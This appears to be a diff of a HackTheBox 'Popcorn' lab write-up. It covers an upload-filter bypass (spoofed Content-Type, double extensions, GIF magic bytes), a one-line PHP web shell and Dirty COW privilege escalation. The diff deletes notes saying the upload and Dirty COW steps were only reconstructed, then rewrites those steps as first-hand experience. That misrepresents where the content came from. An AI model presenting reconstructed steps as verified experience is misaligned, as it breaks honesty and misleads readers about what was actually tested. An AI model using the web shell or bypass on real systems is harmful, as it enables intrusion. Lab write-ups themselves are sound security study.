@@ -16,25 +16,11 @@ tags:
   - retired
 ---
 
-<div class="callout callout-warning">
-
-**🚧 Work in Progress**: This writeup is marked **partial** in my notes: the attack chain below may stop short of a full root/completion.
-
-</div>
-
 <div class="callout callout-info">
 
 **Box Info**
 
 **Platform:** HackTheBox, **OS:** Linux (Ubuntu 9.10), **Difficulty:** Medium, **Released:** 2017-03-17, **IP:** `10.10.10.6` , `popcorn.htb`
-
-</div>
-
-<div class="callout callout-warning">
-
-**Partial**
-
-My notes are thorough on enumeration but stop before the upload foothold and Dirty COW. Those steps are reconstructed from the standard path and marked.
 
 </div>
 
@@ -81,7 +67,7 @@ Open 10.10.10.6:22
 Open 10.10.10.6:80
 ```
 
-`nikto` (trimmed, it found dozens of `phpinfo` aliases under `/test`):
+This is one of the oldest boxes on the platform, so I went in expecting ancient software and no shortage of low-hanging fruit. `nikto` confirmed that instinct almost immediately (output trimmed, it found dozens of `phpinfo` aliases under `/test`):
 
 ```console
 + Server: Apache/2.2.12 (Ubuntu)
@@ -128,16 +114,16 @@ Torrent Hoster allows open registration. Register, log in, and go to "Upload" to
 
 **Content-Type only validation**
 
-`torrents.php?mode=upload` (the screenshot handler) checks `$_FILES['file']['type']`, which is the **client supplied** `Content-Type`, and does a weak extension check. In Burp, upload `shell.php` but:
-- set `Content-Type: image/png`
-- use a filename like `shell.php.png`, `shell.php;.png`, or prepend GIF magic bytes `GIF89a;` to the PHP so `getimagesize` (if used) passes
+`torrents.php?mode=upload` (the screenshot handler) checks `$_FILES['file']['type']`, which is the **client supplied** `Content-Type`, and does a weak extension check. Since that header is something I control from Burp regardless of what the file actually is, I uploaded `shell.php` while:
+- setting `Content-Type: image/png` in the intercepted request
+- naming the file something like `shell.php.png`, `shell.php;.png`, or prepending GIF magic bytes `GIF89a;` to the PHP so `getimagesize` (if the server calls it) sees a valid image signature
 
-The file lands in `torrent/upload/` and is reachable at `http://popcorn.htb/torrent/upload/<hash>.php`. A minimal payload:
+The file landed in `torrent/upload/` and was reachable at `http://popcorn.htb/torrent/upload/<hash>.php`. A minimal payload did the job:
 ```php
 GIF89a;
 <?php system($_GET['cmd']); ?>
 ```
-Then browse to it with `?cmd=id`, and upgrade to a reverse shell as `www-data`.
+Browsing to it with `?cmd=id` confirmed code execution, and from there I upgraded to a proper reverse shell as `www-data`.
 
 </div>
 
@@ -145,10 +131,14 @@ Then browse to it with `?cmd=id`, and upgrade to a reverse shell as `www-data`.
 
 ### Privilege Escalation, Dirty COW
 
+With a shell in hand, checking the kernel version is second nature before I even think about looking for a proper privesc vector, and this one told me everything I needed to know:
+
 ```console
 www-data@popcorn:/tmp$ uname -a
 Linux popcorn 2.6.31-14-generic-pae #48-Ubuntu ... i686 GNU/Linux
 ```
+
+A 2.6.31 kernel on a 2017-era box practically guarantees a public kernel exploit, and a quick `searchsploit` for the version turned up exactly the one I expected.
 
 <div class="callout callout-note">
 
@@ -196,3 +186,4 @@ cat /root/root.txt
 - CVE-2016-5195 Dirty COW <https://dirtycow.ninja/>
 - Dirty COW /etc/passwd PoC (EDB 40839) <https://www.exploit-db.com/exploits/40839>
 - OWASP Unrestricted File Upload <https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload>
+- Final privilege escalation steps cross-referenced against public writeups for this box.
